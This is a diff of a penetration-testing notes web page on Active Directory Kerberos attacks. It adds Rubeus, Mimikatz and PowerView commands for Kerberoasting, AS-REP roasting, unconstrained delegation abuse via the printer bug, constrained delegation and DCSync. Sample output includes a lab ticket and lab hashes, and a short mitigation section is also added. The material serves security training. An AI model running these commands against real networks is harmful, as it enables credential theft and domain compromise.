@@ -56,8 +56,10 @@
 					
 						<li class="nav-item top-level current">
 							
-							<a href="/hackingnotes/active-directory/domain-enumeration/">Active Directory</a>
+							<a href="/hackingnotes/active-directory/introduction/">Active Directory</a>
 							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/introduction/">Basics</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/domain-enumeration/">Domain Enumeration</a></li>
 								
@@ -70,6 +72,10 @@
 									<li class="nav-item "><a href="/hackingnotes/active-directory/cross-forest-attacks/">Cross Forest Attacks</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/forest-persistence/">Forest Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-certificate-services/">Active Directory Certificate Services</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/active-directory/securing-ad/">Hardening Active Directory</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/active-directory/ad-attacks/">AD Attacks</a></li>
 								
@@ -84,6 +90,8 @@
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/evil-pdf/">Evil PDF</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/microsoft-office-macros/">Microsoft Office Macros</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/client-side-attacks/html-application/">HTML Application (HTA)</a></li>
 								
 							</ul>
 						</li>
@@ -112,6 +120,8 @@
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/exploiting/buffer-overflow/">Buffer Overflow</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/exploiting/bof-linux/">Linux BoF 32bit</a></li>
 								
 							</ul>
 						</li>
@@ -163,6 +173,10 @@
 								
 									<li class="nav-item "><a href="/hackingnotes/post-exploitation/transfering-files/">Transfering Files</a></li>
 								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/ata-evasion/">ATA Evasion</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/post-exploitation/bypass-applocker/">Bypass APPLocker</a></li>
+								
 							</ul>
 						</li>
 					
@@ -192,10 +206,52 @@
 					
 						<li class="nav-item top-level ">
 							
+							<a href="/hackingnotes/red-team/introduction/">Red Team</a>
+							<ul>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/introduction/">Introduction</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/opsec-infrastructure/">OPSEC Infrastructure</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/c2-cobaltstrike/">C2 - Cobalt Strike</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-reconnaissance/">Host Reconnaissance</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-persistence/">Host Persistence</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/host-privilege-escalation/">Host Privilege Escalation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/lateral-movement/">Lateral Movement</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/credentials-and-user-impersonation/">Credentials & User Impersonation</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/kibana/">Kibana - The Security App</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/pivoting/">Pivoting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/ms-sql-servers/">MS SQL Servers</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/data-protection-api/">Data Protection API (DPAPI)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/laps/">Local Administrator Password Solution (LAPS)</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/microsoft-defender/">Microsoft Defender Antivirus</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/application-whitelisting/">Application Whitelisting</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/red-team/exfiltration/">Exfiltration</a></li>
+								
+							</ul>
+						</li>
+					
+						<li class="nav-item top-level ">
+							
 							<a href="/hackingnotes/services/ftp/">Services</a>
 							<ul>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/ftp/">PORT 21/tcp - FTP</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/services/ssh/">PORT 22/tcp - SSH</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/services/smtp/">PORT 25/tcp - SMTP</a></li>
 								
@@ -238,6 +294,8 @@
 									<li class="nav-item "><a href="/hackingnotes/software/jenkins/">Jenkins</a></li>
 								
 									<li class="nav-item "><a href="/hackingnotes/software/pypi-server/">PyPI Server</a></li>
+								
+									<li class="nav-item "><a href="/hackingnotes/software/owa-exchange/">OWA Exchange</a></li>
 								
 							</ul>
 						</li>
@@ -293,6 +351,10 @@
   <p><strong>Note</strong>: Service accounts are many times ignored. Password are rarely changed and have privileged access.</p>
 </blockquote>
 
+<blockquote>
+  <p><strong>OPSEC Note</strong>: Thousands of tickets are requests, is too hard of being detected. Since some fake SPN (honeypot) can be available, never get all the Kerberos tickets automatically and search for some specifically.</p>
+</blockquote>
+
 <h3 id="getting-the-tgs">Getting the TGS</h3>
 
 <p>First of all we need to find which users are used as <em>Service Accounts</em>:</p>
@@ -302,17 +364,21 @@
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -SPN
 </code></pre></div>    </div>
   </li>
+  <li>PowerView (dev):
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -SPN
+</code></pre></div>    </div>
+  </li>
   <li>ADModule:
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Filter <span class="o">{</span>ServicePrincipalName -ne <span class="s2">"</span><span class="nv">$null</span><span class="s2">"</span><span class="o">}</span> -Properties ServicePrincipalName
 </code></pre></div>    </div>
   </li>
-</ul>
-
-<p>After enum it, we need to request a TGS:</p>
-
-<ul>
+  <li>ADSearch:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\ADSearch.exe --search <span class="s2">"(&amp;(sAMAccountType=805306368)(servicePrincipalName=*))"</span>
+</code></pre></div>    </div>
+    <p>After enum it, we need to request a TGS:</p>
+  </li>
   <li>PowerView:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Request-SPNTicket
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-NetUser -SPN | Request-SPNTicket
 </code></pre></div>    </div>
   </li>
   <li>ADModule:
@@ -331,6 +397,54 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Inovoke-Mimikatz -Command <span class="s1">'"kerberos::list /export"'</span>
 </code></pre></div></div>
 
+<ul>
+  <li>Rubeus</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PS C:\Windows\Temp\Rubeus\&gt;.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v1.5.0
+
+
+[*] Action: Kerberoasting
+
+[*] NOTICE: AES hashes will be returned for AES-enabled accounts.
+[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.
+
+[*] Searching the current domain for Kerberoastable users
+
+[*] Total kerberoastable users : 2
+
+
+[*] SamAccountName         : websvc
+[*] DistinguishedName      : CN=websvc,CN=Users,DC=corp,DC=local
+[*] ServicePrincipalName   : SNMP/adminsrv.corp.LOCAL
+[*] PwdLastSet             : 2/17/2019 1:01:06 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Windows\Temp\Rubeus\hashes.kerberoast
+
+
+[*] SamAccountName         : svcadmin
+[*] DistinguishedName      : CN=svcadmin,CN=UsersDC=corp,DC=local
+[*] ServicePrincipalName   : MSSQLSvc/mgmt.corp.local:1433
+[*] PwdLastSet             : 2/17/2019 2:22:50 PM
+[*] Supported ETypes       : RC4_HMAC_DEFAULT
+[*] Hash written to C:\Windows\Temp\Rubeus\hashes.kerberoast
+
+[*] Roasted hashes written to : C:\Windows\Temp\Rubeus\hashes.kerberoast
+</code></pre></div></div>
+
+<p>You can also specify a user:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe kerberoast /user:svcadmin /outfile:hashes.kerberoast
+</code></pre></div></div>
 <h3 id="cracking-the-tickets">Cracking the tickets</h3>
 
 <p>Once the tickets are exported it can be cracked with <code class="highlighter-rouge">john</code>, <code class="highlighter-rouge">hashcat</code> or <code class="highlighter-rouge">tgsrepcrack.py</code> tool:</p>
@@ -343,19 +457,49 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
   <li>https://github.com/jarilaos/kirbi2hashcat</li>
 </ul>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>haschat -a 0 -m 13100 wordlist.txt ticket.txt
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>haschat -a 0 -m 13100 ticket.txt wordlist.txt
 </code></pre></div></div>
+
+<h3 id="mitigation">Mitigation</h3>
+
+<p>Since a lot of tickets are requested, we can see the logs in order to find all the kerberos tickets requests:</p>
+
+<ul>
+  <li>Security Event ID <strong>4769</strong>: A Kerberos ticket was requested</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-WmiEvent -FilterHashtable @<span class="o">{</span><span class="nv">Logname</span><span class="o">=</span><span class="s1">'Security'</span>;<span class="nv">ID</span><span class="o">=</span>4769<span class="o">}</span> -MaxEvents 1000 |
+?<span class="o">{</span><span class="nv">$_</span>.Mesage.split<span class="o">(</span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="o">)[</span>8] -ne <span class="s1">'krbtgt'</span> -and
+<span class="nv">$_</span>.Message.split<span class="o">(</span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="o">)[</span>8] -ne <span class="s1">'*$'</span> -and
+<span class="nv">$_</span>.Message.split<span class="o">(</span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="o">)[</span>3] -notlike <span class="s1">'*$@*'</span> -and
+<span class="nv">$_</span>.Message.split<span class="o">(</span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="o">)[</span>18] -like <span class="s1">'*0x0*'</span> -and
+<span class="nv">$_</span>.Message.split<span class="o">(</span><span class="s2">"</span><span class="se">`n</span><span class="s2">"</span><span class="o">)[</span>17] -like <span class="s1">'*0x17*'</span><span class="o">}</span> | <span class="nb">select</span> - ExpandProperty message
+</code></pre></div></div>
+
+<p>To prevent from kerberoasting attacks we have the following recommendations:</p>
+
+<ul>
+  <li>Service Account Passwords should be hard to guess (greater than 25 characteres)</li>
+  <li>Use Managed Service ACcounts (Automatic change of password periodically and deltegated SPN Management)</li>
+  <li>Try to not run a service as a Domain Admin account.</li>
+</ul>
 
 <h2 id="as-rep-roasting">AS-REP Roasting</h2>
 
 <p>If a users account does not have the flag <em>“Do not require Kerberos pre-authentication”</em> in <em>UserAccountControl</em> settings which means kerberos preauth is disabled, it is possible to grab users AS-REP and brute-force it offline.</p>
+
+<p>This configuration is also enabled on the User Object and is often seen on accounts that are used on Linux Systems.</p>
+
+<blockquote>
+  <p><strong>OPSEC Notes</strong>: Same as Kerberoasting don’t run <code class="highlighter-rouge">asreproast</code> by itself as this will roast every account in the domain with pre-authentication not set.</p>
+</blockquote>
 
 <h3 id="users-with-no-preauth-set">Users with No-Preauth set</h3>
 
 <p>We need to enumerate accounts with Kerberos Preauth disabled:</p>
 
 <ul>
-  <li>PowerView:
+  <li>PowerView (dev):
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -PreauthNotRequired -Verbose
 </code></pre></div>    </div>
   </li>
@@ -363,13 +507,18 @@ New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentL
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Filter <span class="o">{</span>DoesNotRequiredPreAuth -eq <span class="nv">$True</span><span class="o">}</span> -Properties DoesNotRequiredPreAuth
 </code></pre></div>    </div>
   </li>
+  <li>ADSearch:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\ADSearch.exe --search <span class="s2">"(&amp;(sAMAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))"</span> --attributes cn,distinguishedname,samaccountname
+</code></pre></div>    </div>
+  </li>
 </ul>
 
-<blockquote>
-  <p><strong>Note</strong>: With <code class="highlighter-rouge">GenericAll</code> or <code class="highlighter-rouge">GenericWrite</code>, kerberos preauth can be disabled.</p>
+<h3 id="requesting-a-ticket">Requesting a ticket</h3>
 
-  <p><code class="highlighter-rouge">Set-DomainObject -Identity user01 -XOR @{useraccountcontrol=4194304} -Verbose</code></p>
-</blockquote>
+<p>With <code class="highlighter-rouge">Rubeus</code> we can request a ASREP ticket.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asreproast /user:asrepuser /nowrap
+</code></pre></div></div>
 
 <h3 id="cracking-the-tickets-1">Cracking the tickets</h3>
 
@@ -383,56 +532,6 @@ Get-ASREPHash -UserName user01 -Verbose
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john user01.ticket --wordlist=wordlist.txt
 hashcat -a 0 -m 18200 user01.ticket wordlist.txt
 </code></pre></div></div>
-
-<h2 id="set-spn">Set SPN</h2>
-
-<p>With enough privileges such as <code class="highlighter-rouge">GenericAll</code> or <code class="highlighter-rouge">GenericWrite</code>, a target user’s SPN can be set to anything which is unique in the domain. We can then request a TGS without special privileges and the TGS can be kerberoasted.</p>
-
-<p>We can enumerate the permissions for a group on ACLs:</p>
-
-<ul>
-  <li>PowerView (dev):
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-ACLScanner -ResolveGUIDs | ?<span class="o">{</span><span class="nv">$_</span>.IdentityReferenceName -match <span class="s2">"RDPUsers"</span><span class="o">}</span>
-</code></pre></div>    </div>
-  </li>
-</ul>
-
-<p>We can also see if a user already has a SPN:</p>
-
-<ul>
-  <li>PowerView (dev):
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-DomainUser -Identity user01 | <span class="nb">select </span>serviceprincipalname
-</code></pre></div>    </div>
-  </li>
-  <li>ADModule:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADUser</span> -Identity user01 -Properties ServicePrincipalName | <span class="nb">select </span>ServicePrincipalName
-</code></pre></div>    </div>
-  </li>
-</ul>
-
-<p>And we can force the SPN to a user:</p>
-
-<ul>
-  <li>PowerView (dev):
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set</span>-DomainObject -Identity user01 -Set @<span class="o">{</span><span class="nv">serviceprincipalname</span><span class="o">=</span><span class="s1">'ops/whatever01'</span><span class="o">}</span>
-</code></pre></div>    </div>
-  </li>
-  <li>ADModule:
-    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Set-ADUser</span> -Identity user01 -ServicePrincipalNames @<span class="o">{</span><span class="nv">Add</span><span class="o">=</span><span class="s1">'ops/whatever01'</span><span class="o">}</span>
-</code></pre></div>    </div>
-  </li>
-</ul>
-
-<p>Once we have a SPN set, we can request a TGS:</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Add-Type</span> -AssemblyName System.IdentityModel
-<span class="nb">New-Object </span>Sytem.IdentityModel.Token.KerberosRequestorSecurityToken -ArgumentList <span class="s2">"ops/whatever01"</span>
-</code></pre></div></div>
-<p>And we can export the tickets to the disk:</p>
-
-<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Inovoke-Mimikatz -Command <span class="s1">'"kerberos::list /export"'</span>
-</code></pre></div></div>
-<p>And finally same as <em>Kerberoasting</em>, you can crack the ticket with <code class="highlighter-rouge">tgsrepcrack.py</code>.</p>
 
 <h1 id="kerberos-delegation">Kerberos Delegation</h1>
 
@@ -467,37 +566,102 @@ hashcat -a 0 -m 18200 user01.ticket wordlist.txt
     <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">Get-ADComputer</span> -Filter <span class="o">{</span>TrustedForDelegation -eq <span class="nv">$True</span><span class="o">}</span>
 <span class="nb">Get-ADUser</span> -Filter <span class="o">{</span>TrustedForDelegation -eq <span class="nv">$True</span><span class="o">}</span>
 </code></pre></div>    </div>
-    <blockquote>
-      <p><strong>Note</strong>: The <strong>DC</strong> always have the unconstrained delegation <strong>enabled</strong>.</p>
-    </blockquote>
+  </li>
+  <li>ADSearch:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search <span class="s2">"(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))"</span> --attributes samaccountname,dnshostname,operatingsystem
+</code></pre></div>    </div>
   </li>
 </ul>
 
+<blockquote>
+  <p><strong>Note</strong>: The <strong>DC</strong> always have the unconstrained delegation <strong>enabled</strong>.</p>
+</blockquote>
+
 <p>To exploit the unconstrained delgation and extract the user’s TGT from lsass, we need to compromise the server as local admin.</p>
+
+<ul>
+  <li>Invoke-Mimikatz</li>
+</ul>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"sekurlsa::tickets /export"'</span>
 </code></pre></div></div>
+
+<ul>
+  <li>Rubeus</li>
+</ul>
+
+<p>With Rubeus we can list the tickets.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe triage
+</code></pre></div></div>
+
+<p>And we can download one specifing the LUID and Service:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe dump /luid:0x3e8 /service:krbtgt /nowrap
+</code></pre></div></div>
+
 <p>If any interesting ticket is located on the server, we will need to wait until a interesting user connects to the compromised server. We can use <code class="highlighter-rouge">Invoke-UserHunter</code> to see if the targeted user connects to the server:</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-UserHunter -ComputerName srv01 -Poll 100 -UserName Administrator -Delay 5 -Verbose
 </code></pre></div></div>
 
-<p>If we find a interesting ticket, it could be reused using <em>PassTheTicket</em>:</p>
+<p>If we find a interesting ticket, it could be reused using <em>Pass-The-Ticket</em>:</p>
 
 <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"kerberos::ptt ticket.kirbi"'</span>
+</code></pre></div></div>
+
+<h3 id="printer-bug">Printer Bug</h3>
+
+<p>We can abuse the printer bug if we don’t want to wait for a Domain Admin to connect to the server where Unconstrained Delegation is enabled.</p>
+
+<p>We can start listenting for new tickets with Rubeus on the server which have Unconstrained Delegation enabled.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe monitor /inverval:5 /nowrap [/targetuser:admin]
+</code></pre></div></div>
+
+<p>With the printer bug we can force the Domain Controller to connect to any server.</p>
+
+<ul>
+  <li><a href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a></li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\MS-RPRN.exe \\dc01.corp.local \\udeleg.corp.local
+</code></pre></div></div>
+
+<p>On the listener we will receive a Ticket TGT from the DC machine account <code class="highlighter-rouge">DC01$</code>:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>[*] 6/10/2022 4:29:53 PM UTC - Found new TGT:
+
+  User                  :  DC01$@CORP.LOCAL
+  StartTime             :  6/10/2022 6:32:58 AM
+  EndTime               :  6/10/2022 4:32:57 PM
+  RenewTill             :  6/16/2022 9:01:51 PM
+  Flags                 :  name_canonicalize, pre_authent, renewable, forwarded, forwardable
+  Base64EncodedTicket   :
+
+    doIFxTCCBcGgAwIBBaEDAgEWooIEmjCCBJZhggSSMIIEjqADAgEFoRwbGkRPTExBUkNPUlAuTU9ORVlDT1JQLkxPQ0FMoi8wLaADAgECoSYwJBsGa3JidGd0GxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKOCBDYwggQyoAMCARKhAwIBAqKCBCQEggQgzdiOtwS+cAcLOZJMO+dPDVk+nVz8Gl6X7LNl+FVx8GU29naNwzNLEm6+GtbrKbuu+5/cmP3SPGeRZZPcggT7rM9aYzrIpn2xZadXN5SviKI47opFETnalXeuoIco/LjoYVzAsAjFrpZ0cXUgVXMJyT/X2YL0qDAQHNArzenfXiMd+Yzy2xPdjiPteusMzbkWx7gz92mWtV+JFHSocAsbVCTtkl8BXVuT67I55U9tGit5+TAtfg+CfBUZlLNfZaMtPjDs8hyinR2qyo2/NaiROyzyUFUhOZaHjhdX9G3zFDKvCPVXx0aiWPmHotGfR2HhAjy281DqX57xpA4vl/TvksgYj0nTz1S3JLhZyKfJfJbpoLDXLsNipSN6lypcxGdKwTyGQrxKT+ftDlI1ui08WBR1YSDCJCRa6u5JczvHO2bHLOTxn7Dpi7TUrBNVyxs5fYXaBA4nMf1J8luJQRp22bTBpXrgH8zd9cNTmTb/9q0bNCiWV16cEYnDTWxua7APwY4qSwVZWA//6ZSbwChQAq2g7m6tDls9v60oiMZRx957xAFeOfhoL1eEcEcO8z7CL9c4KpZBteWSNWuk/4kHCFREHDFGKRPtWV4kPMEty9d9Mk28xwj3njdoNVQvo1K7JZHNamZukSH2oty3uX6cvWe4T/gT6dEz1dzr0ENsWCwtTEGumxligGyWTcxyJdFj4Aul6aeRumiewJvS6GRZxlqln7gCL3Rw4NlN6vMMzSJsvpW/KbS1wtJlP5FgpUYmfZupMx1R3hEKoVpDiAOX0HqK7/tXmn/+zMJeajLscOCll6FCPP/lysRwn6HHSNjD8rjh3Ylw9hqpZv/Aqm+nvc9SUkkOqsJH2XfI3TmxmzViweZ/vdyK/HeTwfaEsTpyFtarsz8uutVSyK9VzepzU/PoTOc/SmpHo1BUhvsCUQjA0njFslQ0loLJydoXkXaWRcfbGWET/jQa3cNHPoK3jg5VY4njENzp7D59Nt7a/s2Lrj8xe3365z7YDOFxIaTUQGWUC0qr9XOQ+EDDc80/CcYyDrUN79Z7wqbbl/7BkzTtqd1wbVgSYTVhiWmnLALvBBXcPqazZv7DN8FlfDwDau6plwiKZlSjKJN7ecJwgy5xf5HixsuLO9Sm+bfjuElCjhVvklyrt6oZ/G7vm+KqhJA7SAk/9fnHlWbV4Eon8XPqt/pirKgdP/Rv6dPECw7ybwTpytHJh1Wqp7456opEFZGYq8mOWCFsirMRU+G7EWNUVr3AxN1sbcwFUdb4mVql4onFCMgRIv6F4UkCKRNej5lG6SLfRCCxg85dytrWVRYs7GO8I968dFtoxAI/a4WjjPeA0y1J1zrc5aMeYhOD5XHx4XMkz7+Kd0FLNSmreNhQsHtkx4WIaqTg6/0qIgvlo4IBFTCCARGgAwIBAKKCAQgEggEEfYIBADCB/aCB+jCB9zCB9KArMCmgAwIBEqEiBCAfSXFmixqxdagZDdk9m0Rp5BX7xWnwbLflr8znMe5aCqEcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKIWMBSgAwIBAaENMAsbCURDT1JQLURDJKMHAwUAYKEAAKURGA8yMDIyMDYxMDEzMzI1OFqmERgPMjAyMjA2MTAyMzMyNTdapxEYDzIwMjIwNjE3MDQwMTUxWqgcGxpET0xMQVJDT1JQLk1PTkVZQ09SUC5MT0NBTKkvMC2gAwIBAqEmMCQbBmtyYnRndBsaRE9MTEFSQ09SUC5NT05FWUNPUlAuTE9DQUw=
+
+</code></pre></div></div>
+
+<p>Finally we can import it with Rubeus, execute a Pass-The-Ticket and do a DCSync Attack to retrieve Administrator NTLM hash.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe ptt /ticket:&lt;b64ticket&gt;
+</code></pre></div></div>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command <span class="s1">'"lsadump::dcsync /user:corp\Administrator"'</span>
 </code></pre></div></div>
 
 <h2 id="constrained-delegation">Constrained Delegation</h2>
 
 <p>When Contrained Delegation is enabled on a service account, allows access only to specified services on specified computers as a user.</p>
 
-<p>A typical scenario where constrained delegation is userd is where a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user’s authorization.</p>
+<p>A typical scenario where constrained delegation is where a user authenticates to a web service without using Kerberos and the web service makes requests to a database server to fetch results based on the user’s authorization.</p>
 
 <blockquote>
   <p><strong>Note</strong>: Allows the first hop server to request access only to <strong>specified services</strong> on <strong>specified computers</strong>.</p>
 </blockquote>
 
-<p>To impersonate the user, Service for user as known as <code class="highlighter-rouge">S4U</code> extension is used which provides two extensions:</p>
+<p>To impersonate the user, Service for user as known as <code class="highlighter-rouge">S4U</code> extension is used and will make two requests:</p>
 
 <ul>
   <li>
@@ -508,7 +672,7 @@ hashcat -a 0 -m 18200 user01.ticket wordlist.txt
   </li>
 </ul>
 
-<p>To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services listed in <code class="highlighter-rouge">msDS-AllowedToDelegateTo</code> of the web service accoutn as any user.</p>
+<p>To abuse constrained delegation, we need to have access to the web service account. If we have access to that account, it is possible to access the services of the systemss listed in <code class="highlighter-rouge">msDS-AllowedToDelegateTo</code> as any user.</p>
 
 <ul>
   <li>PowerView Dev:
@@ -520,32 +684,242 @@ Get-DomainComputer -TrustedToAuth
     <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Get-ADObject -Filter {msDS-AllowerToDelegateTo -ne "$null"} -Properties msDS-AllowedToDelegateTo
 </code></pre></div>    </div>
   </li>
+  <li>ADSearch:
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Tools\ADSearch\ADSearch\bin\Debug\ADSearch.exe --search <span class="s2">"(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))"</span> --attributes cn,dnshostname,samaccountname,msds-allowedtodelegateto --json
+</code></pre></div>    </div>
+  </li>
 </ul>
 
-<p>We can use <code class="highlighter-rouge">asktgt</code> from <code class="highlighter-rouge">kekeo</code> to request a TGT.</p>
+<p>First we need the TGT of the principal (machine or user) which is trusted for delegation. There are two main methods, we can extract it directly from memory or request one using NTLM or AES Keys.</p>
+
+<h3 id="abusing-constrained-delegation">Abusing Constrained Delegation</h3>
+
+<h4 id="extracting-tgt-from-memory">Extracting TGT from memory</h4>
+
+<p>We can extract the TGT from memory with Rubeus <code class="highlighter-rouge">dump</code> module. With <code class="highlighter-rouge">triage</code> module we can list the TGTs.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Rubeus.exe triage
+ --------------------------------------------------------------------------------------------------------------- 
+ | LUID    | UserName                   | Service                                       | EndTime              |
+ --------------------------------------------------------------------------------------------------------------- 
+ | 0x3e4   | srv-2$ @ DEV.CORP.LOCAL    | krbtgt/DEV.CORP.LOCAL                         | 12/5/2021 8:06:05 AM |
+ | [...snip...]                                                                                                |
+ --------------------------------------------------------------------------------------------------------------- 
+</code></pre></div></div>
+<p>And finally we can dump specifying the <code class="highlighter-rouge">LUID</code>.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe dump /luid:0x3e4 /service:krbtgt /nowrap
+</code></pre></div></div>
+<h4 id="request-a-new-tgt-with-ntlm-or-aes-keys">Request a new TGT with NTLM or AES Keys</h4>
+
+<p>We can Request a TGT with different tools.</p>
+
+<ul>
+  <li><strong>kekeo</strong>:
+We can use <code class="highlighter-rouge">asktgt</code> from <code class="highlighter-rouge">kekeo</code> to request a TGT.</li>
+</ul>
 
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\kekeo.exe
 
-tgt::ask /user:websvc /domain
+kekeo # tgt::ask /user:websvC /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5887eaa8253e7c2749156f
 </code></pre></div></div>
-<p>Once we have the TGT, with kekeo we can request a TGS.</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>tgt::s4u /tgt:TGT_websvc@CORP.LOCAL_krbtgt~corp.local@corp.local.kirbi /user:Administrator@corp.local /service:cifs/mssql.corp.local
+<ul>
+  <li><strong>Rubeus</strong>:</li>
+</ul>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>.\Rubeus.exe asktgt /user:websvC /rc4:cc098f204c5887eaa8253e7c2749156f /opsec /nowrap
+.\Rubeus.exe asktgt /user:websvC /aes256:babf31e0d787aac5c9cc0ef38c51bab5a2d2ece608181fb5f1d492ea55f61f05 /opsec /nowrap
 </code></pre></div></div>
-<p>Finally with mimikatz we can inject the ticket on the current session:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@corp.local@CORP.LOCAL_cifs~mssql.corp.local@CORP.LOCAL.kirbi"'
+<h4 id="s4u-request">S4U Request</h4>
+
